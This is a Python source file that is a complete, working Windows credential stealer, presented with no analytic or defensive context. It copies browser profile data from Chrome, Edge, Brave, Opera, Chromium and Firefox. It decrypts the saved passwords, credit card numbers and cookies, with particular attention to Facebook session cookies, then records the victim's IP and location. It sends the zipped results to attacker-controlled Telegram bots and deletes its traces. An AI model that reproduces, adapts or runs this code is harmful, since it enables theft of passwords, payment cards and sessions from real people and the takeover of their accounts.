import os,json,shutil,win32crypt,hmac,platform,sqlite3,base64,random,requests,subprocess
from datetime import datetime,timedelta
from Crypto.Cipher import DES3
from Crypto.Cipher import AES
from pyasn1.codec.der import decoder
from hashlib import sha1, pbkdf2_hmac
from Crypto.Util.Padding import unpad 
from base64 import b64decode
idbot = "backup"
apibot1='apiKey'
id1='idGroup1'
apibot2='apiKey'
id2='idGroup2'
hostname = os.getenv("COMPUTERNAME")
usernamex = os.getlogin()
windows_version = platform.platform()
now = datetime.now()
response =requests.get("https://ipinfo.io").text
ip_country = json.loads(response)
name_country = ip_country['region']
timezone = ip_country['timezone']
city = ip_country['city']
ip = ip_country['ip']
country_code = ip_country['country']
newtime = str(now.hour) + "h" +str(now.minute)+"m"+str(now.second)+"s"+"-"+str(now.day)+"-"+str(now.month)+"-"+str(now.year)
name_f = country_code +" "+idbot+" "+ ip +" "+newtime
def find_profile(path_userdata):
    profile_path = []
    for name in os.listdir(path_userdata):
        if name.startswith("Profile") or name == 'Default':
            dir_path = os.path.join(path_userdata, name)
            profile_path.append(dir_path)
    return profile_path
def get_chrome(data_path,chrome_path):
    data_chrome = os.path.join(data_path, "Chrome");os.mkdir(data_chrome)
    profiles = find_profile(chrome_path)
    for i,profile in enumerate(profiles, 1):
        os.mkdir(os.path.join(data_chrome,"profile"+str(i)))
        def copy_file():
            try:
                if os.path.exists(os.path.join(profile,'Network','Cookies')):
                    shutil.copyfile(os.path.join(profile,'Network','Cookies'),os.path.join(data_chrome,"profile"+str(i),'Cookies')) 
            except:
                if os.path.exists(os.path.join(profile,'Network','Cookies')):
                    shutil.copyfile(os.path.join(profile,'Network','Cookies'),os.path.join(data_chrome,"profile"+str(i),'Cookies')) 
            if os.path.exists(os.path.join(profile,'Login Data')):
                shutil.copyfile(os.path.join(profile,'Login Data'),os.path.join(data_chrome,"profile"+str(i),'Login Data'))
            if os.path.exists(os.path.join(profile,'Web Data')):
                shutil.copyfile(os.path.join(profile,'Web Data'),os.path.join(data_chrome,"profile"+str(i),'Web Data'))
            if os.path.exists(os.path.join(chrome_path,'Local State')):
                shutil.copyfile(os.path.join(chrome_path,'Local State'),os.path.join(data_chrome,"profile"+str(i),'Local State'))
        nem_profile = "profile"+str(i)
        copy_file();delete_file(data_path,"Chrome",nem_profile)     
def get_edge(data_path,edge_path):
    data_edge = os.path.join(data_path, "Edge");os.mkdir(data_edge)
    profiles = find_profile(edge_path)
    for i,profile in enumerate(profiles, 1):
        os.mkdir(os.path.join(data_edge,"profile"+str(i)))
        def copy_file():
            if os.path.exists(os.path.join(profile,'Network','Cookies')):
                shutil.copyfile(os.path.join(profile,'Network','Cookies'),os.path.join(data_edge,"profile"+str(i),'Cookies'))
            if os.path.exists(os.path.join(profile,'Web Data')):
                shutil.copyfile(os.path.join(profile,'Web Data'),os.path.join(data_edge,"profile"+str(i),'Web Data'))
            if os.path.exists(os.path.join(profile,'Login Data')):
                shutil.copyfile(os.path.join(profile,'Login Data'),os.path.join(data_edge,"profile"+str(i),'Login Data'))
            if os.path.exists(os.path.join(edge_path,'Local State')):
                shutil.copyfile(os.path.join(edge_path,'Local State'),os.path.join(data_edge,"profile"+str(i),'Local State'))
        nem_profile = "profile"+str(i)
        copy_file();delete_file(data_path,"Edge",nem_profile)  
def get_brave(data_path,brave_path):
    data_brave = os.path.join(data_path, "Brave");os.mkdir(data_brave)
    profiles = find_profile(brave_path)
    for i,profile in enumerate(profiles, 1):
        os.mkdir(os.path.join(data_brave,"profile"+str(i)))
        def copy_file():
            if os.path.exists(os.path.join(profile,'Network','Cookies')):
                shutil.copyfile(os.path.join(profile,'Network','Cookies'),os.path.join(data_brave,"profile"+str(i),'Cookies'))
            if os.path.exists(os.path.join(profile,'Web Data')):
                shutil.copyfile(os.path.join(profile,'Web Data'),os.path.join(data_brave,"profile"+str(i),'Web Data'))
            if os.path.exists(os.path.join(profile,'Login Data')):
                shutil.copyfile(os.path.join(profile,'Login Data'),os.path.join(data_brave,"profile"+str(i),'Login Data'))
            if os.path.exists(os.path.join(brave_path,'Local State')):
                shutil.copyfile(os.path.join(brave_path,'Local State'),os.path.join(data_brave,"profile"+str(i),'Local State'))
        nem_profile = "profile"+str(i)
        copy_file();delete_file(data_path,"Brave",nem_profile)
def get_opera(data_path,opera_path):
    data_opera = os.path.join(data_path, "Opera");os.mkdir(data_opera)
    def copy_file():
        if os.path.exists(os.path.join(opera_path,'Network','Cookies')):
            shutil.copyfile(os.path.join(opera_path,'Network','Cookies'),os.path.join(data_opera,'Cookies'))
        if os.path.exists(os.path.join(opera_path,'Web Data')):
                shutil.copyfile(os.path.join(opera_path,'Web Data'),os.path.join(data_opera,'Web Data'))
        if os.path.exists(os.path.join(opera_path,'Login Data')):
            shutil.copyfile(os.path.join(opera_path,'Login Data'),os.path.join(data_opera,'Login Data'))
        if os.path.exists(os.path.join(opera_path,'Local State')):
            shutil.copyfile(os.path.join(opera_path,'Local State'),os.path.join(data_opera,'Local State'))
    copy_file();delete_file(data_path,"Opera","")
def get_chromium(data_path,chromium_path):
    data_chromium= os.path.join(data_path, "Chromium");os.mkdir(data_chromium)
    profiles = find_profile(chromium_path)
    for i,profile in enumerate(profiles, 1):
        os.mkdir(os.path.join(data_chromium,"profile"+str(i)))
        def copy_file():
            if os.path.exists(os.path.join(profile,'Cookies')):
                shutil.copyfile(os.path.join(profile,'Cookies'),os.path.join(data_chromium,"profile"+str(i),'Cookies'))
            if os.path.exists(os.path.join(profile,'Web Data')):
                shutil.copyfile(os.path.join(profile,'Web Data'),os.path.join(data_chromium,"profile"+str(i),'Web Data'))
            if os.path.exists(os.path.join(profile,'Login Data')):
                shutil.copyfile(os.path.join(profile,'Login Data'),os.path.join(data_chromium,"profile"+str(i),'Login Data'))
            if os.path.exists(os.path.join(chromium_path,'Local State')):
                shutil.copyfile(os.path.join(chromium_path,'Local State'),os.path.join(data_chromium,"profile"+str(i),'Local State'))
        nem_profile = "profile"+str(i)
        copy_file();delete_file(data_path,"Chromium",nem_profile)
def find_profile_firefox(firefox_path):
    profile_path = []
    for name in os.listdir(firefox_path):
            dir_path = os.path.join(firefox_path, name)
            profile_path.append(dir_path)
    return profile_path
def get_firefox(data_path,firefox_path):
    data_firefox = os.path.join(data_path,'firefox');os.mkdir(data_firefox)
    profiles = find_profile_firefox(firefox_path)
    for i,profile in enumerate(profiles, 1):
        os.mkdir(os.path.join(data_firefox,"profile"+str(i)))
        def copy_file():
            if os.path.exists(os.path.join(profile,'cookies.sqlite')):
                shutil.copyfile(os.path.join(profile,'cookies.sqlite'),os.path.join(data_firefox,"profile"+str(i),'cookies.sqlite'))
            if os.path.exists(os.path.join(profile,'key4.db')):
                shutil.copyfile(os.path.join(profile,'key4.db'),os.path.join(data_firefox,"profile"+str(i),'key4.db'))
            if os.path.exists(os.path.join(profile,'logins.json')):
                shutil.copyfile(os.path.join(profile,'logins.json'),os.path.join(data_firefox,"profile"+str(i),'logins.json'))
        copy_file()
        if os.path.exists(os.path.join(data_firefox,"profile"+str(i),'cookies.sqlite')):
            delete_firefox(os.path.join(data_firefox,"profile"+str(i)))
        else:
            shutil.rmtree(os.path.join(data_firefox,"profile"+str(i)))   
def encrypt(data_path,name_bz,name_profile):
    key_db = os.path.join(data_path ,name_bz,name_profile,"Local State")
    login_db = os.path.join(data_path ,name_bz,name_profile,"Login Data")
    cookie_db = os.path.join(data_path ,name_bz,name_profile,"Cookies")
    credit_db=os.path.join(data_path ,name_bz,name_profile,"Web Data")
    with open(key_db, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)
    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]  
    master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
    try :
        conn = sqlite3.connect(login_db)
        cursor = conn.cursor()
        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
        for r in cursor.fetchall():
            url = r[0]
            username = r[1]
            encrypted_password = r[2]
            iv = encrypted_password[3:15]
            payload = encrypted_password[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_password = decrypted_pass[:-16].decode() 
            with open((os.path.join(data_path, "password.txt")), 'a',encoding='utf-8') as f:
                f.write("URL: " + url + "\nUSERNAME: " + username + "\nPASS: " + decrypted_password +"\n\nAPPLICATION: "+name_bz+"-"+name_profile+"\n\n"+50*'*'+"\n")      
    except :
        print("Error ")
    try:
        db_cre = sqlite3.connect(credit_db)
        cursor_credit = db_cre.cursor()
        cursor_credit.execute("SELECT * FROM credit_cards")
        rows1 = cursor_credit.fetchall()
        for row1 in rows1:
            encrypted_credit = row1[4]
            iv1 = encrypted_credit[3:15]
            payload1 = encrypted_credit[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv1)
            decrypted_cre = cipher.decrypt(payload1)
            decrypted_credit= decrypted_cre[:-16].decode() 
            with open((os.path.join(os.environ["TEMP"], name_f, "credit.txt")), 'a',encoding='utf-8') as f:
                f.write("Card number : "+str(decrypted_credit) +"\nExpiration date : "+str(row1[2])+"/"+str(row1[3])+"\nName : "+str(row1[1])+"\nNickname : "+str(row1[10]+"\n\n"))
    except:print("")
    try:    
        conn2 = sqlite3.connect(cookie_db)
        conn2.text_factory = lambda b: b.decode(errors="ignore")
        cursor2 = conn2.cursor()
        cursor2.execute("""
        SELECT host_key, name, value, encrypted_value,is_httponly,is_secure,expires_utc
        FROM cookies
        """)
        json_data = []
        for host_key, name, value,encrypted_value,is_httponly,is_secure,expires_utc in cursor2.fetchall():
            if not value:
                iv = encrypted_value[3:15]
                encrypted_value = encrypted_value[15:]
                cipher = AES.new(master_key, AES.MODE_GCM, iv)
                decrypted_value = cipher.decrypt(encrypted_value)[:-16].decode()
            else:
                decrypted_value = value     
            json_data.append({
                "host": host_key,
                "name": name,
                "value": decrypted_value,
                "is_httponly":is_httponly,
                "is_secure":is_secure,
                "expires_utc":expires_utc
                })
        result = []
        for item in json_data:
            host = item["host"]
            name = item["name"]
            value = item["value"]
            is_httponly= item["is_httponly"]
            is_secure=item["is_secure"]
            expires_utc = item["expires_utc"]
            if host == ".facebook.com":
                result.append(f"{name} = {value}")
            if is_httponly == 1 : httponly = "TRUE"
            else:httponly = "FAILSE"
            if is_secure == 1 : secure = "TRUE"
            else:secure = "FAILSE"
            cookie = f"{host}\t{httponly}\t{'/'}\t{secure}\t\t{name}\t{value}\n"     
            x_nameck=name_bz+"-"+name_profile+ ".txt"
            with open((os.path.join(data_path,"filecookie",x_nameck)), 'a') as f:
                f.write(cookie)
    except:
        print(f"Error decrypt data: {str(e)}")
def delete_file(data_path,name_bz,name_profile):
    try:
        encrypt(data_path,name_bz,name_profile)
    except:print("")
def decryptMoz3DES( globalSalt, entrySalt, encryptedData ):
  hp = sha1( globalSalt ).digest()
  pes = entrySalt + b'\x00'*(20-len(entrySalt))
  chp = sha1( hp+entrySalt ).digest()
  k1 = hmac.new(chp, pes+entrySalt, sha1).digest()
  tk = hmac.new(chp, pes, sha1).digest()
  k2 = hmac.new(chp, tk+entrySalt, sha1).digest()
  k = k1+k2
  iv = k[-8:]
  key = k[:24]
  return DES3.new( key, DES3.MODE_CBC, iv).decrypt(encryptedData)
def decodeLoginData(data):
  asn1data = decoder.decode(b64decode(data)) # decodage base64, puis ASN1
  key_id = asn1data[0][0].asOctets()
  iv = asn1data[0][1][1].asOctets()
  ciphertext = asn1data[0][2].asOctets()
  return key_id, iv, ciphertext 
def getLoginData(afkk):
  logins = []
  json_file = os.path.join(afkk ,"logins.json")
  loginf = open( json_file, 'r',encoding='utf-8').read()
  jsonLogins = json.loads(loginf)
  for row in jsonLogins['logins']:
    encUsername = row['encryptedUsername']
    encPassword = row['encryptedPassword']
    logins.append( (decodeLoginData(encUsername), decodeLoginData(encPassword), row['hostname']) )
  return logins
def decryptPBE(decodedItem, globalSalt): 
  pbeAlgo = str(decodedItem[0][0][0])
  if pbeAlgo == '1.2.840.113549.1.12.5.1.3': 
    entrySalt = decodedItem[0][0][1][0].asOctets()
    cipherT = decodedItem[0][1].asOctets()
    key = decryptMoz3DES( globalSalt, entrySalt, cipherT )
    return key[:24]
  elif pbeAlgo == '1.2.840.113549.1.5.13': #pkcs5 pbes2  
    entrySalt = decodedItem[0][0][1][0][1][0].asOctets()
    iterationCount = int(decodedItem[0][0][1][0][1][1])
    keyLength = int(decodedItem[0][0][1][0][1][2])
    k = sha1(globalSalt).digest()
    key = pbkdf2_hmac('sha256', k, entrySalt, iterationCount, dklen=keyLength)    
    iv = b'\x04\x0e'+decodedItem[0][0][1][1][1].asOctets()
    cipherT = decodedItem[0][1].asOctets()
    clearText = AES.new(key, AES.MODE_CBC, iv).decrypt(cipherT)
    return clearText
def getKey(afk):  
    conn = sqlite3.connect(os.path.join(afk, "key4.db"))
    c = conn.cursor()
    c.execute("SELECT item1,item2 FROM metadata;")
    row = c.fetchone()
    globalSalt = row[0] 
    item2 = row[1]
    decodedItem2 = decoder.decode( item2 ) 
    clearText = decryptPBE( decodedItem2, globalSalt )
    if clearText == b'password-check\x02\x02': 
      c.execute("SELECT a11,a102 FROM nssPrivate;")
      for row in c:
        if row[0] != None:
            break
      a11 = row[0]
      a102 = row[1] 
      if a102 != None: 
        decoded_a11 = decoder.decode( a11 )
        clearText= decryptPBE( decoded_a11, globalSalt )
        return clearText[:24]   
    return None
def encrypt_firefox(path_f):
    try:
        if os.path.exists(os.path.join(path_f ,"logins.json")):
            key = getKey(path_f)
            logins = getLoginData(path_f)
            for i in logins:
                username= unpad( DES3.new( key, DES3.MODE_CBC, i[0][1]).decrypt(i[0][2]),8 ) 
                password= unpad( DES3.new( key, DES3.MODE_CBC, i[1][1]).decrypt(i[1][2]),8 ) 
                str_pass =  password.decode('utf-8')
                str_user =  username.decode('utf-8')
                with open((os.path.join(path_f,"password.txt")), 'a',encoding='utf-8') as f:
                    f.write(i[2]+"          "+str_user + "|"+ str_pass + "\n")
    except :
        print("")
    try:
        db_path = os.path.join(path_f, "cookies.sqlite")
        db = sqlite3.connect(db_path) 
        db.text_factory = lambda b: b.decode(errors="ignore")
        cursor = db.cursor()
        cursor.execute("""
        SELECT id , name, value ,host
        FROM moz_cookies
        """)
        json_data = []
        for id , name, value ,host in cursor.fetchall():
            json_data.append({
                "host": host,
                "name": name,
                "value": value
            })
        result = []
        for item in json_data:
            host = item["host"]
            name = item["name"]
            value = item["value"]
            if host == ".facebook.com":
                result.append(f"{name} = {value}")
            cookie = f"{host}\t\t{'/'}\t\t\t{name}\t{value}\n"          
            with open((os.path.join(path_f, "cookie.txt")), 'a') as f:
                f.write(cookie)
    except:
        print("")
def delete_firefox(data_firefox_profile):
    try:
        encrypt_firefox(data_firefox_profile)
    except: print("")
def intNumbers() :
    path_demso = r"C:\Users\Public\number.txt"
    if os.path.exists(path_demso):
        with open(path_demso, 'r') as file:
            number = file.read()
        number = int(number)+1
        with open(path_demso, 'w') as file:
            abc = str(number)
            file.write(abc)
    else:
        with open(path_demso, 'w') as file:
            file.write("1")
            number = 1
    return number
def get_browser_data(data_path, browser_path, browser_name):
    try:
        if os.path.exists(browser_path):
            if browser_name == 'chrome':
                get_chrome(data_path, browser_path)
            elif browser_name == 'Edge':
                get_edge(data_path, browser_path)
            elif browser_name == 'Opera':
                get_opera(data_path, browser_path)
            elif browser_name == 'Brave':
                get_brave(data_path, browser_path)
            elif browser_name == 'firefox':
                get_firefox(data_path, browser_path)
            elif browser_name == 'chromium':
                get_chromium(data_path, browser_path)
    except Exception as e:
        print(f"Error extracting data from {browser_name}: {str(e)}")
def main():
    numbers=intNumbers()
    number = "Status number send: " + str(numbers)
    u2 = 'https://api.telegram.org/bot'+apibot2+'/sendDocument'
    u1 = 'https://api.telegram.org/bot'+apibot1+'/sendDocument'
    browsers = {
        'chrome': os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data"),
        'Edge': os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data"),
        'Opera': os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Opera Software", "Opera Stable"),
        'Brave': os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data"),
        'firefox': os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Mozilla", "Firefox", "Profiles"),
        'chromium': os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Chromium", "User Data")
    }
    data_path = os.path.join(os.environ["TEMP"], name_f)
    os.mkdir(data_path)
    data_path_ck = os.path.join(os.environ["TEMP"], name_f, "filecookie")
    os.mkdir(data_path_ck)
    for browser_name, browser_path in browsers.items():
        get_browser_data(data_path, browser_path, browser_name)
    zip_file_path = os.path.join(os.environ["TEMP"], name_f + '.zip')
    shutil.make_archive(zip_file_path[:-4], 'zip', data_path)
    if numbers == 1:
        with open(zip_file_path, 'rb') as f:
            requests.post(u1,data={'caption': "\n"+"Country : "+name_country + "-" + timezone + "\n"+ windows_version +"\r\nIPAdress:"+ip + "\r\n"+ number,'chat_id': id1},files={'document': f})
    else : 
        with open(zip_file_path, 'rb') as f:
            requests.post(u2,data={'caption': "\n"+"Country :  "+ name_country + "-" + timezone +"\n"+ windows_version +"\r\nIPAddress:"+ip + "\r\n"+ number,'chat_id': id2},files={'document': f})
    shutil.rmtree(data_path, ignore_errors=True)
    try:
        os.remove(zip_file_path)
    except Exception as e:
        print("Error")
main()